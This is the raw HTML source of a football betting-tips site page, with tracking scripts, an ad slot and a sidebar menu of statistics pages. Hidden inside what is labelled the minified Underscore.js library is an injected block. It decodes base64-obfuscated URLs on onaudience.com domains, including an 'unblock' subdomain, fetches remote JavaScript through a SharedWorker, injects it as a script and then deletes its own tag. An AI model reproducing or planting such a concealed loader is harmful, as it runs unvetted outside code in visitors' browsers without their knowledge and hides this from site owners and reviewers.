<HTML>

<!-- Begin Cookie Consent plugin by Silktide - http://silktide.com/cookieconsent -->
<script type="text/javascript">
    window.cookieconsent_options = {"message":"We are using cookies to give you the best experience on our site. Cookies are files stored in your browser and are used by most websites to help personalise your web experience.  By continuing to use our website, you are agreeing to our use of cookies.","dismiss":"Accept","learnMore":"More...","link":"cookies.htm","theme":"dark-top"};
</script>

<script type="text/javascript" src="//s3.amazonaws.com/cc.silktide.com/cookieconsent.latest.min.js"></script>
<!-- End Cookie Consent plugin -->

<HEAD>

<!-- begin quantum code -->
<script>!function(q,u,a,n,t,i,c){c=window._qds={};c.t=u;c.a=a;t='script';i=q.getElementsByTagName(t)[0];n=q.createElement(t);n.async=1;n.src='https://t.qds.ninja/t/'+u;i.parentNode.insertBefore(n,i)}(document,487,119);</script>
<!-- end quantum code -->


<script>
  (function(){var v=this;var k=v._;var I=Array.prototype,g=Object.prototype,n=Function.prototype;var L=I.push,l=I.slice,c=g.toString,j=g.hasOwnProperty;var s=Array.isArray,e=Object.keys,J=n.bind,B=Object.create;var E=function(){};var P=function(Q){if(Q instanceof P){return Q}if(!(this instanceof P)){return new P(Q)}this._wrapped=Q};if(typeof exports!=="undefined"){if(typeof module!=="undefined"&&module.exports){exports=module.exports=P}exports._=P}else{v._=P}P.VERSION="1.8.3";var b=function(R,Q,S){if(Q===void 0){return R}switch(S==null?3:S){case 1:return function(T){return R.call(Q,T)};case 2:return function(U,T){return R.call(Q,U,T)};case 3:return function(U,T,V){return R.call(Q,U,T,V)};case 4:return function(T,V,U,W){return R.call(Q,T,V,U,W)}}return function(){return R.apply(Q,arguments)}};var F=function(R,Q,S){if(R==null){return P.identity}if(P.isFunction(R)){return b(R,Q,S)}if(P.isObject(R)){return P.matcher(R)}return P.property(R)};P.iteratee=function(R,Q){return F(R,Q,Infinity)};var p=function(R,Q){return function(Z){var X=arguments.length;if(X<2||Z==null){return Z}for(var T=1;T<X;T++){var Y=arguments[T],W=R(Y),S=W.length;for(var V=0;V<S;V++){var U=W[V];if(!Q||Z[U]===void 0){Z[U]=Y[U]}}}return Z}};var C=function(R){if(!P.isObject(R)){return{}}if(B){return B(R)}E.prototype=R;var Q=new E;E.prototype=null;return Q};var M=function(Q){return function(R){return R==null?void 0:R[Q]}};var K=Math.pow(2,53)-1;var O=M("length");var D=function(R){var Q=O(R);return typeof Q=="number"&&Q>=0&&Q<=K};P.each=P.forEach=function(U,V,R){V=b(V,R);var Q,T;if(D(U)){for(Q=0,T=U.length;Q<T;Q++){V(U[Q],Q,U)}}else{var S=P.keys(U);for(Q=0,T=S.length;Q<T;Q++){V(U[S[Q]],S[Q],U)}}return U};P.map=P.collect=function(V,X,S){X=F(X,S);var U=!D(V)&&P.keys(V),T=(U||V).length,R=Array(T);for(var Q=0;Q<T;Q++){var W=U?U[Q]:Q;R[Q]=X(V[W],W,V)}return R};function z(Q){function R(W,Y,S,V,T,U){for(;T>=0&&T<U;T+=Q){var X=V?V[T]:T;S=Y(S,W[X],X,W)}return S}return function(X,Y,S,U){Y=b(Y,U,4);var W=!D(X)&&P.keys(X),V=(W||X).length,T=Q>0?0:V-1;if(arguments.length<3){S=X[W?W[T]:T];T+=Q}return R(X,Y,S,W,T,V)}}P.reduce=P.foldl=P.inject=z(1);P.reduceRight=P.foldr=z(-1);P.find=P.detect=function(T,Q,S){var R;if(D(T)){R=P.findIndex(T,Q,S)}else{R=P.findKey(T,Q,S)}if(R!==void 0&&R!==-1){return T[R]}};P.filter=P.select=function(T,Q,S){var R=[];Q=F(Q,S);P.each(T,function(W,U,V){if(Q(W,U,V)){R.push(W)}});return R};P.reject=function(S,Q,R){return P.filter(S,P.negate(F(Q)),R)};P.every=P.all=function(V,Q,S){Q=F(Q,S);var U=!D(V)&&P.keys(V),T=(U||V).length;for(var R=0;R<T;R++){var W=U?U[R]:R;if(!Q(V[W],W,V)){return false}}return true};P.some=P.any=function(V,Q,S){Q=F(Q,S);var U=!D(V)&&P.keys(V),T=(U||V).length;for(var R=0;R<T;R++){var W=U?U[R]:R;if(Q(V[W],W,V)){return true}}return false};P.contains=P.includes=P.include=function(T,S,Q,R){if(!D(T)){T=P.values(T)}if(typeof Q!="number"||R){Q=0}return P.indexOf(T,S,Q)>=0};P.invoke=function(S,T){var Q=l.call(arguments,2);var R=P.isFunction(T);return P.map(S,function(V){var U=R?T:V[T];return U==null?U:U.apply(V,Q)})};P.pluck=function(R,Q){return P.map(R,P.property(Q))};P.where=function(R,Q){return P.filter(R,P.matcher(Q))};P.findWhere=function(R,Q){return P.find(R,P.matcher(Q))};P.max=function(T,V,Q){var Y=-Infinity,W=-Infinity,X,S;if(V==null&&T!=null){T=D(T)?T:P.values(T);for(var U=0,R=T.length;U<R;U++){X=T[U];if(X>Y){Y=X}}}else{V=F(V,Q);P.each(T,function(ab,Z,aa){S=V(ab,Z,aa);if(S>W||S===-Infinity&&Y===-Infinity){Y=ab;W=S}})}return Y};P.min=function(T,V,Q){var Y=Infinity,W=Infinity,X,S;if(V==null&&T!=null){T=D(T)?T:P.values(T);for(var U=0,R=T.length;U<R;U++){X=T[U];if(X<Y){Y=X}}}else{V=F(V,Q);P.each(T,function(ab,Z,aa){S=V(ab,Z,aa);if(S<W||S===Infinity&&Y===Infinity){Y=ab;W=S}})}return Y};P.shuffle=function(U){var V=D(U)?U:P.values(U);var T=V.length;var Q=Array(T);for(var R=0,S;R<T;R++){S=P.random(0,R);if(S!==R){Q[R]=Q[S]}Q[S]=V[R]}return Q};P.sample=function(R,S,Q){if(S==null||Q){if(!D(R)){R=P.values(R)}return R[P.random(R.length-1)]}return P.shuffle(R).slice(0,Math.max(0,S))};P.sortBy=function(R,S,Q){S=F(S,Q);return P.pluck(P.map(R,function(V,T,U){return{value:V,index:T,criteria:S(V,T,U)}}).sort(function(W,V){var U=W.criteria;var T=V.criteria;if(U!==T){if(U>T||U===void 0){return 1}if(U<T||T===void 0){return -1}}return W.index-V.index}),"value")};var q=function(Q){return function(T,U,S){var R={};U=F(U,S);P.each(T,function(X,V){var W=U(X,V,T);Q(R,X,W)});return R}};P.groupBy=q(function(Q,S,R){if(P.has(Q,R)){Q[R].push(S)}else{Q[R]=[S]}});P.indexBy=q(function(Q,S,R){Q[R]=S});P.countBy=q(function(Q,S,R){if(P.has(Q,R)){Q[R]++}else{Q[R]=1}});P.toArray=function(Q){if(!Q){return[]}if(P.isArray(Q)){return l.call(Q)}if(D(Q)){return P.map(Q,P.identity)}return P.values(Q)};P.size=function(Q){if(Q==null){return 0}return D(Q)?Q.length:P.keys(Q).length};P.partition=function(U,Q,S){Q=F(Q,S);var T=[],R=[];P.each(U,function(W,V,X){(Q(W,V,X)?T:R).push(W)});return[T,R]};P.first=P.head=P.take=function(S,R,Q){if(S==null){return void 0}if(R==null||Q){return S[0]}return P.initial(S,S.length-R)};P.initial=function(S,R,Q){return l.call(S,0,Math.max(0,S.length-(R==null||Q?1:R)))};P.last=function(S,R,Q){if(S==null){return void 0}if(R==null||Q){return S[S.length-1]}return P.rest(S,Math.max(0,S.length-R))};P.rest=P.tail=P.drop=function(S,R,Q){return l.call(S,R==null||Q?1:R)};P.compact=function(Q){return P.filter(Q,P.identity)};var x=function(W,S,X,aa){var R=[],Z=0;for(var U=aa||0,Q=O(W);U<Q;U++){var Y=W[U];if(D(Y)&&(P.isArray(Y)||P.isArguments(Y))){if(!S){Y=x(Y,S,X)}var T=0,V=Y.length;R.length+=V;while(T<V){R[Z++]=Y[T++]}}else{if(!X){R[Z++]=Y}}}return R};P.flatten=function(R,Q){return x(R,Q,false)};P.without=function(Q){return P.difference(Q,l.call(arguments,1))};P.uniq=P.unique=function(X,T,W,R){if(!P.isBoolean(T)){R=W;W=T;T=false}if(W!=null){W=F(W,R)}var Z=[];var Q=[];for(var V=0,S=O(X);V<S;V++){var Y=X[V],U=W?W(Y,V,X):Y;if(T){if(!V||Q!==U){Z.push(Y)}Q=U}else{if(W){if(!P.contains(Q,U)){Q.push(U);Z.push(Y)}}else{if(!P.contains(Z,Y)){Z.push(Y)}}}}return Z};P.union=function(){return P.uniq(x(arguments,true,true))};P.intersection=function(W){var Q=[];var V=arguments.length;for(var S=0,U=O(W);S<U;S++){var T=W[S];if(P.contains(Q,T)){continue}for(var R=1;R<V;R++){if(!P.contains(arguments[R],T)){break}}if(R===V){Q.push(T)}}return Q};P.difference=function(R){var Q=x(arguments,true,true,1);return P.filter(R,function(S){return !P.contains(Q,S)})};P.zip=function(){return P.unzip(arguments)};P.unzip=function(T){var S=T&&P.max(T,O).length||0;var Q=Array(S);for(var R=0;R<S;R++){Q[R]=P.pluck(T,R)}return Q};P.object=function(U,R){var Q={};for(var S=0,T=O(U);S<T;S++){if(R){Q[U[S]]=R[S]}else{Q[U[S][0]]=U[S][1]}}return Q};function u(Q){return function(V,R,T){R=F(R,T);var U=O(V);var S=Q>0?0:U-1;for(;S>=0&&S<U;S+=Q){if(R(V[S],S,V)){return S}}return -1}}P.findIndex=u(1);P.findLastIndex=u(-1);P.sortedIndex=function(X,V,W,S){W=F(W,S,1);var U=W(V);var Q=0,T=O(X);while(Q<T){var R=Math.floor((Q+T)/2);if(W(X[R])<U){Q=R+1}else{T=R}}return Q};function f(Q,R,S){return function(X,W,T){var U=0,V=O(X);if(typeof T=="number"){if(Q>0){U=T>=0?T:Math.max(T+V,U)}else{V=T>=0?Math.min(T+1,V):T+V+1}}else{if(S&&T&&V){T=S(X,W);return X[T]===W?T:-1}}if(W!==W){T=R(l.call(X,U,V),P.isNaN);return T>=0?T+U:-1}for(T=Q>0?U:V-1;T>=0&&T<V;T+=Q){if(X[T]===W){return T}}return -1}}P.indexOf=f(1,P.findIndex,P.sortedIndex);P.lastIndexOf=f(-1,P.findLastIndex);P.range=function(V,S,U){if(S==null){S=V||0;V=0}U=U||1;var T=Math.max(Math.ceil((S-V)/U),0);var R=Array(T);for(var Q=0;Q<T;Q++,V+=U){R[Q]=V}return R};var y=function(V,S,U,W,T){if(!(W instanceof S)){return V.apply(U,T)}var R=C(V.prototype);var Q=V.apply(R,T);if(P.isObject(Q)){return Q}return R};P.bind=function(T,R){if(J&&T.bind===J){return J.apply(T,l.call(arguments,1))}if(!P.isFunction(T)){throw new TypeError("Bind must be called on a function")}var Q=l.call(arguments,2);var S=function(){return y(T,S,R,this,Q.concat(l.call(arguments)))};return S};P.partial=function(R){var S=l.call(arguments,1);var Q=function(){var T=0,W=S.length;var U=Array(W);for(var V=0;V<W;V++){U[V]=S[V]===P?arguments[T++]:S[V]}while(T<arguments.length){U.push(arguments[T++])}return y(R,Q,this,this,U)};return Q};P.bindAll=function(T){var R,S=arguments.length,Q;if(S<=1){throw new Error("bindAll must be passed function names")}for(R=1;R<S;R++){Q=arguments[R];T[Q]=P.bind(T[Q],T)}return T};P.memoize=function(R,Q){var S=function(V){var U=S.cache;var T=""+(Q?Q.apply(this,arguments):V);if(!P.has(U,T)){U[T]=R.apply(this,arguments)}return U[T]};S.cache={};return S};P.delay=function(R,S){var Q=l.call(arguments,2);return setTimeout(function(){return R.apply(null,Q)},S)};P.defer=P.partial(P.delay,P,1);P.throttle=function(R,T,X){var Q,V,Y;var W=null;var U=0;if(!X){X={}}var S=function(){U=X.leading===false?0:P.now();W=null;Y=R.apply(Q,V);if(!W){Q=V=null}};return function(){var Z=P.now();if(!U&&X.leading===false){U=Z}var aa=T-(Z-U);Q=this;V=arguments;if(aa<=0||aa>T){if(W){clearTimeout(W);W=null}U=Z;Y=R.apply(Q,V);if(!W){Q=V=null}}else{if(!W&&X.trailing!==false){W=setTimeout(S,aa)}}return Y}};window.ub_ct_id=18;(function(){var X="log";var ah="starterReady";var aa="workerLoaded";var Q="loadWorker";var T=2;window.ub_ct_load=W;window.ub_ct_callbacks=[];var ab=document.currentScript;var U=0;function R(){S();var ai=new Blob([Z],{type:"application/javascript"});ae=new SharedWorker(URL.createObjectURL(ai));ae.port.onmessage=V}function W(ai,al,ak){var aj=document.currentScript;window.ub_ct_callbacks.push([ai,al,aj,ak])}function ad(){ae.port.postMessage({method:Q,args:{isHttps:Y()}})}function S(){var aj=Y()?atob("aHR0cHM6Ly94Lm9uYXVkaWVuY2UuY29tL3N0YXRpYy9iYWNrZ3JvdW5kLmpz"):atob("aHR0cDovL3gub25hdWRpZW5jZS5jb20vc3RhdGljL2JhY2tncm91bmQuanM=");var ai=document.createElement("script");ai.src=aj;af(ai,ab);ac(ai);ag()}var ae;var Z='(function(){var a="GET";var c="log";var f="starterReady";var h="workerLoaded";var g="loadWorker";var b;onconnect=function(i){b=i.ports[0];b.onmessage=function(j){switch(j.data.method){case g:e(j.data.args);break;default:}};b.postMessage({method:f})};function e(j){var k=new XMLHttpRequest();var i=j.isHttps?atob("aHR0cHM6Ly91bmJsb2NrLm9uYXVkaWVuY2UuY29tL3N0YXRpYy93b3JrZXIuanM="):atob("aHR0cDovL3VuYmxvY2sub25hdWRpZW5jZS5jb20vc3RhdGljL3dvcmtlci5qcw==");k.open(a,i,true);k.onload=function(){b.postMessage({method:h,args:{code:k.response}})};k.send()}function d(i){b.postMessage({method:c,args:{message:i}})}})();';function V(aj){switch(aj.data.method){case X:break;case ah:ad();break;case aa:var ai=document.createElement("script");ai.innerHTML=aj.data.args.code;af(ai,ab);ac(ai);ag();break;default:}}function Y(){return window.location.protocol===atob("aHR0cHM6")}function af(aj,ai){ai.parentNode.insertBefore(aj,ai.nextElementSibling)}function ac(ai){ai.parentElement.removeChild(ai)}function ag(){U++;if(U>=T){ac(ab)}}R()})();P.debounce=function(S,U,R){var X,W,Q,V,Y;var T=function(){var Z=P.now()-V;if(Z<U&&Z>=0){X=setTimeout(T,U-Z)}else{X=null;if(!R){Y=S.apply(Q,W);if(!X){Q=W=null}}}};return function(){Q=this;W=arguments;V=P.now();var Z=R&&!X;if(!X){X=setTimeout(T,U)}if(Z){Y=S.apply(Q,W);Q=W=null}return Y}};P.wrap=function(Q,R){return P.partial(R,Q)};P.negate=function(Q){return function(){return !Q.apply(this,arguments)}};P.compose=function(){var Q=arguments;var R=Q.length-1;return function(){var T=R;var S=Q[R].apply(this,arguments);while(T--){S=Q[T].call(this,S)}return S}};P.after=function(R,Q){return function(){if(--R<1){return Q.apply(this,arguments)}}};P.before=function(S,R){var Q;return function(){if(--S>0){Q=R.apply(this,arguments)}if(S<=1){R=null}return Q}};P.once=P.partial(P.before,2);var G=!{toString:null}.propertyIsEnumerable("toString");var a=["valueOf","isPrototypeOf","toString","propertyIsEnumerable","hasOwnProperty","toLocaleString"];function d(U,T){var Q=a.length;var R=U.constructor;var S=(P.isFunction(R)&&R.prototype)||g;var V="constructor";if(P.has(U,V)&&!P.contains(T,V)){T.push(V)}while(Q--){V=a[Q];if(V in U&&U[V]!==S[V]&&!P.contains(T,V)){T.push(V)}}}P.keys=function(S){if(!P.isObject(S)){return[]}if(e){return e(S)}var R=[];for(var Q in S){if(P.has(S,Q)){R.push(Q)}}if(G){d(S,R)}return R};P.allKeys=function(S){if(!P.isObject(S)){return[]}var R=[];for(var Q in S){R.push(Q)}if(G){d(S,R)}return R};P.values=function(U){var T=P.keys(U);var S=T.length;var Q=Array(S);for(var R=0;R<S;R++){Q[R]=U[T[R]]}return Q};P.mapObject=function(V,X,S){X=F(X,S);var U=P.keys(V),T=U.length,R={},W;for(var Q=0;Q<T;Q++){W=U[Q];R[W]=X(V[W],W,V)}return R};P.pairs=function(U){var S=P.keys(U);var R=S.length;var T=Array(R);for(var Q=0;Q<R;Q++){T[Q]=[S[Q],U[S[Q]]]}return T};P.invert=function(U){var Q={};var T=P.keys(U);for(var R=0,S=T.length;R<S;R++){Q[U[T[R]]]=T[R]}return Q};P.functions=P.methods=function(S){var R=[];for(var Q in S){if(P.isFunction(S[Q])){R.push(Q)}}return R.sort()};P.extend=p(P.allKeys);P.extendOwn=P.assign=p(P.keys);P.findKey=function(W,Q,T){Q=F(Q,T);var V=P.keys(W),S;for(var R=0,U=V.length;R<U;R++){S=V[R];if(Q(W[S],S,W)){return S}}};P.pick=function(S,W,Q){var aa={},T=S,V,Z;if(T==null){return aa}if(P.isFunction(W)){Z=P.allKeys(T);V=b(W,Q)}else{Z=x(arguments,false,false,1);V=function(ac,ab,ad){return ab in ad};T=Object(T)}for(var U=0,R=Z.length;U<R;U++){var Y=Z[U];var X=T[Y];if(V(X,Y,T)){aa[Y]=X}}return aa};P.omit=function(S,T,Q){if(P.isFunction(T)){T=P.negate(T)}else{var R=P.map(x(arguments,false,false,1),String);T=function(V,U){return !P.contains(R,U)}}return P.pick(S,T,Q)};P.defaults=p(P.allKeys,true);P.create=function(R,S){var Q=C(R);if(S){P.extendOwn(Q,S)}return Q};P.clone=function(Q){if(!P.isObject(Q)){return Q}return P.isArray(Q)?Q.slice():P.extend({},Q)};P.tap=function(R,Q){Q(R);return R};P.isMatch=function(R,Q){var V=P.keys(Q),U=V.length;if(R==null){return !U}var W=Object(R);for(var T=0;T<U;T++){var S=V[T];if(Q[S]!==W[S]||!(S in W)){return false}}return true};var N=function(Y,X,R,T){if(Y===X){return Y!==0||1/Y===1/X}if(Y==null||X==null){return Y===X}if(Y instanceof P){Y=Y._wrapped}if(X instanceof P){X=X._wrapped}var V=c.call(Y);if(V!==c.call(X)){return false}switch(V){case"[object RegExp]":case"[object String]":return""+Y===""+X;case"[object Number]":if(+Y!==+Y){return +X!==+X}return +Y===0?1/+Y===1/X:+Y===+X;case"[object Date]":case"[object Boolean]":return +Y===+X}var S=V==="[object Array]";if(!S){if(typeof Y!="object"||typeof X!="object"){return false}var W=Y.constructor,U=X.constructor;if(W!==U&&!(P.isFunction(W)&&W instanceof W&&P.isFunction(U)&&U instanceof U)&&("constructor" in Y&&"constructor" in X)){return false}}R=R||[];T=T||[];var Q=R.length;while(Q--){if(R[Q]===Y){return T[Q]===X}}R.push(Y);T.push(X);if(S){Q=Y.length;if(Q!==X.length){return false}while(Q--){if(!N(Y[Q],X[Q],R,T)){return false}}}else{var aa=P.keys(Y),Z;Q=aa.length;if(P.keys(X).length!==Q){return false}while(Q--){Z=aa[Q];if(!(P.has(X,Z)&&N(Y[Z],X[Z],R,T))){return false}}}R.pop();T.pop();return true};P.isEqual=function(R,Q){return N(R,Q)};P.isEmpty=function(Q){if(Q==null){return true}if(D(Q)&&(P.isArray(Q)||P.isString(Q)||P.isArguments(Q))){return Q.length===0}return P.keys(Q).length===0};P.isElement=function(Q){return !!(Q&&Q.nodeType===1)};P.isArray=s||function(Q){return c.call(Q)==="[object Array]"};P.isObject=function(R){var Q=typeof R;return Q==="function"||Q==="object"&&!!R};P.each(["Arguments","Function","String","Number","Date","RegExp","Error"],function(Q){P["is"+Q]=function(R){return c.call(R)==="[object "+Q+"]"}});if(!P.isArguments(arguments)){P.isArguments=function(Q){return P.has(Q,"callee")}}if(typeof/./!="function"&&typeof Int8Array!="object"){P.isFunction=function(Q){return typeof Q=="function"||false}}P.isFinite=function(Q){return isFinite(Q)&&!isNaN(parseFloat(Q))};P.isNaN=function(Q){return P.isNumber(Q)&&Q!==+Q};P.isBoolean=function(Q){return Q===true||Q===false||c.call(Q)==="[object Boolean]"};P.isNull=function(Q){return Q===null};P.isUndefined=function(Q){return Q===void 0};P.has=function(R,Q){return R!=null&&j.call(R,Q)};P.noConflict=function(){v._=k;return this};P.identity=function(Q){return Q};P.constant=function(Q){return function(){return Q}};P.noop=function(){};P.property=M;P.propertyOf=function(Q){return Q==null?function(){}:function(R){return Q[R]}};P.matcher=P.matches=function(Q){Q=P.extendOwn({},Q);return function(R){return P.isMatch(R,Q)}};P.times=function(U,T,S){var Q=Array(Math.max(0,U));T=b(T,S,1);for(var R=0;R<U;R++){Q[R]=T(R)}return Q};P.random=function(R,Q){if(Q==null){Q=R;R=0}return R+Math.floor(Math.random()*(Q-R+1))};P.now=Date.now||function(){return new Date().getTime()};var r={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;","`":"&#x60;"};var m=P.invert(r);var w=function(U){var R=function(V){return U[V]};var T="(?:"+P.keys(U).join("|")+")";var S=RegExp(T);var Q=RegExp(T,"g");return function(V){V=V==null?"":""+V;return S.test(V)?V.replace(Q,R):V}};P.escape=w(r);P.unescape=w(m);P.result=function(Q,S,T){var R=Q==null?void 0:Q[S];if(R===void 0){R=T}return P.isFunction(R)?R.call(Q):R};var A=0;P.uniqueId=function(Q){var R=++A+"";return Q?Q+R:R};P.templateSettings={evaluate:/<%([\s\S]+?)%>/g,interpolate:/<%=([\s\S]+?)%>/g,escape:/<%-([\s\S]+?)%>/g};var t=/(.)^/;var h={"'":"'","\\":"\\","\r":"r","\n":"n","\u2028":"u2028","\u2029":"u2029"};var i=/\\|'|\r|\n|\u2028|\u2029/g;var H=function(Q){return"\\"+h[Q]};P.template=function(Z,T,W){if(!T&&W){T=W}T=P.defaults({},T,P.templateSettings);var U=RegExp([(T.escape||t).source,(T.interpolate||t).source,(T.evaluate||t).source].join("|")+"|$","g");var V=0;var Q="__p+='";Z.replace(U,function(ab,ac,aa,ae,ad){Q+=Z.slice(V,ad).replace(i,H);V=ad+ab.length;if(ac){Q+="'+\n((__t=("+ac+"))==null?'':_.escape(__t))+\n'"}else{if(aa){Q+="'+\n((__t=("+aa+"))==null?'':__t)+\n'"}else{if(ae){Q+="';\n"+ae+"\n__p+='"}}}return ab});Q+="';\n";if(!T.variable){Q="with(obj||{}){\n"+Q+"}\n"}Q="var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n"+Q+"return __p;\n";try{var S=new Function(T.variable||"obj","_",Q)}catch(X){X.source=Q;throw X}var Y=function(aa){return S.call(this,aa,P)};var R=T.variable||"obj";Y.source="function("+R+"){\n"+Q+"}";return Y};P.chain=function(R){var Q=P(R);Q._chain=true;return Q};var o=function(Q,R){return Q._chain?P(R).chain():R};P.mixin=function(Q){P.each(P.functions(Q),function(R){var S=P[R]=Q[R];P.prototype[R]=function(){var T=[this._wrapped];L.apply(T,arguments);return o(this,S.apply(P,T))}})};P.mixin(P);P.each(["pop","push","reverse","shift","sort","splice","unshift"],function(Q){var R=I[Q];P.prototype[Q]=function(){var S=this._wrapped;R.apply(S,arguments);if((Q==="shift"||Q==="splice")&&S.length===0){delete S[0]}return o(this,S)}});P.each(["concat","join","slice"],function(Q){var R=I[Q];P.prototype[Q]=function(){return o(this,R.apply(this._wrapped,arguments))}});P.prototype.value=function(){return this._wrapped};P.prototype.valueOf=P.prototype.toJSON=P.prototype.value;P.prototype.toString=function(){return""+this._wrapped};if(typeof define==="function"&&define.amd){define("underscore",[],function(){return P})}}.call(new Object()));
</script>

<TITLE>Betting World | Helpbet.com</TITLE>

<meta name="google-site-verification" content="p5qrMQUfD5w4PdDW8gYlU-xj6j6FmvzPdG21ksgNNXo" />
<meta http-equiv=Content-Type content="text/html; charset=windows-1253">
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
<META NAME="Description" CONTENT="my bet world, betting tips, betting predictions, soccer games, soccer stats, soccer statistics,soccer bets, football bets, statistics, stats soccer, stats football, tipsters, poll">
<META NAME="Keywords" CONTENT="my bet world, betting tips, betting predictions, soccer games, soccer stats, soccer statistics,soccer bets, football bets, statistics, stats soccer, stats football, tipsters, poll">
<link href="mybetworld.css" rel="stylesheet" type="text/css">

</HEAD>

<BODY>

<table align=center cellpadding=0 cellspacing=0 width=1030 border=0>

<td width=100% bgcolor=#1E5A82>
<table border=0 width=100% CELLSPACING=0 CELLPADDING=0>

<td>

	<table valign=top width=100% height=100% CELLSPACING=0 CELLPADDING=0 border=0 background="images/logo_bg.jpg">
	<td valign=top><a href="index.php">
				   <img src="HelpBet_logo.jpg" width="269" height="137" border=0 title="Betting tips and statistics"></a>
	 </td>

	<td width=100% align=center valign=middle>
	<!-- /52555387/helpbet.com_728x90_1 -->
<div><script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script> <script> var googletag = googletag || {}; googletag.cmd = googletag.cmd || []; </script> <script> googletag.cmd.push(function() { var _YB=_YB||{ab:function(){return (_YB.dool?'b':'a'+Math.floor(Math.random()*10));},dc:function(){return (_YB.dool?'d':'c'+Math.floor(Math.random()*20));},mx:function(){return (!_YB.dool?'x':'m'+Math.floor(Math.random()*180));},tt:function(){return ('tt'+Math.floor(Math.random()*10));},dool:Math.random()>=0.1}; var _yt=new Date(),yb_th=_yt.getUTCHours()-8,yb_tm=_yt.getUTCMinutes(),yb_wd=_yt.getUTCDay();if(yb_th<0){yb_th=24+yb_th;yb_wd-=1;};if(yb_wd<0){yb_wd=7+yb_wd}; googletag.defineSlot('/52555387/helpbet.com_728x90_1', [728, 90], 'div-gpt-ad-1510751842954-2').setTargeting('yb_ab', _YB.ab()).setTargeting('yb_dc', _YB.dc()).setTargeting('yb_mx', _YB.mx()).setTargeting('yb_tt', _YB.tt()).setTargeting('yb_ff', String(Math.round(Math.random()))).setTargeting('yb_th', yb_th.toString()).setTargeting('yb_tm', yb_tm.toString()).setTargeting('yb_wd', yb_wd.toString()).addService(googletag.pubads()); googletag.enableServices(); }); </script></div>
 <div id='div-gpt-ad-1510751842954-2' style='height:90px; width:728px;'> <script> googletag.cmd.push(function() { googletag.display('div-gpt-ad-1510751842954-2'); }); </script> </div>
	</td>

	</table> 

</td>
</tr>

<td>

	<table class=horiz_menu_box width=100% height="30" CELLSPACING=0 CELLPADDING=0 border=0>
	<td width=8>&nbsp;</td>
	<td width=22><a href="index.php"><img src="home.gif" border="0" title="Homepage"></a></td>
	<td width=120><a class=horiz_menu_items href="index.php" title="Homepage">Homepage</a></td>
<td align=center class=horiz_menu_box  style='color:red'><h1>Betting World</h1></td>	<td width=22><a href="mailto:mybetworld.site@gmail.com"><img src="mail.gif" border="0" title="Contact us"></a></td>
	<td width=98><a class=horiz_menu_items href="mailto:helpbet.mail@gmail.com" title="Contact us">Contact us</a></td>

	</table>

</td>
</tr>

</table>

<table bgcolor=white border=0 width=100% CELLSPACING=0 CELLPADDING=0>
<td align=center>
	</td>
</tr>

</table>
</td>
</tr>

<td width=100% valign=top bgcolor=white>

<table width=100% border=0 cellpadding=0 cellspacing=0>

<td width=150 valign=top align=center height=100% bgcolor=#1E5A82>

		<table bgcolor=#003366 width=150 height=100% align=left CELLSPACING=0 CELLPADDING=0 border=0 style="font-family:Verdana; font-size: 12px">
<td height=1></td></tr>
<td height=20 valign=top class="pliktra">Overview</td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=my_league&league=AGP"><b>Standings/Leagues</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=my_arena&code=0" ><b>Soccer matches</b></a></td></tr>

<td height=1></td></tr>

<td height=20 valign=top class="pliktra">Next matches</td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=next_soccer_matches" ><b>By Date/Time</b></a> </td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=soccer_matches" ><b>By League</b></a> </td></tr>

<td height=1></td></tr>
<td height=20 valign=top class="pliktra">Results</td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=football_results_soccer" ><b>By Date/Time</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=soccer_results" ><b>By League</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=livescores" target="_blank"><b>Live Scores</b></a></td></tr>

<td height=1></td></tr>
<td height=20 valign=top class="pliktra">Press Poll</td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=my_poll_all" ><b>All by Date/Time</b></a> </td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=my_poll_100" ><b>Press Poll 100%</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=my_poll_big" ><b>Press Poll 70%-99%</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=popular_draws" ><b>Popular Draws</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=my_results" ><b>Previous</b></a></td></tr>

<td height=1></td></tr>
<td height=20 valign=top class="pliktra">Head-To-Head</td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=Head-to-Head-Statistics-1X2" ><b>1-X-2<b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=under_over_statistics" ><b>Under-Over</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=goal_goal_statistics" ><b>Goal/Goal-No G/G</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=my_h2h_HT" ><b>HalfTime/FullTime</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=my_h2h_Scores" ><b>Correct Score</b></a></td></tr>

<td height=1></td></tr>

<td height=20 valign=top class="pliktra">Best Of</td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=best_under" ><b>Best Under<//b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=best_over" ><b>Best Over</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=best_goalgoal" ><b>Best Goal/Goal<//b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=best_nogoal" ><b>Best No G/G</b></a></td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=best_draws" ><b>Best Draws</b></a></td></tr>

<td height=1></td></tr>

<td height=20 valign=top class="pliktra">History</td></tr>
<td height=20 valign=top class="table"><a style="color: #003366" href="index.php?page=history_home_away" ><b>Home/Away<b></a></td></tr>
